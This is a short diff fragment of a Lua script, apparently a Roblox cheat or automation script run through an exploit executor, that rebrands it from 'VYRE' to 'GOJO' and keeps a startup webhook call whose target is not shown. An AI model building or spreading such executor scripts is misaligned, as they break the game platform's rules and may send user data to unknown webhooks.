-    UI.shineLine("VYRE ON TOP", "success", 0.08)
+    UI.shineLine("GOJO ON TOP", "success", 0.08)
     task.wait(1.5)
     if WEBHOOK_ENABLED and not _webhookStartupSent then
         _webhookStartupSent = true
@@ -4217,4 +4373,4 @@ local function stopAll()
     if radiusFolder then pcall(function() radiusFolder:Destroy() end) end
 end
 UI.SG.Destroying:Connect(stopAll)
-if getgenv then getgenv().VYREStop = stopAll end
+if getgenv then getgenv().GOJOStop = stopAll end
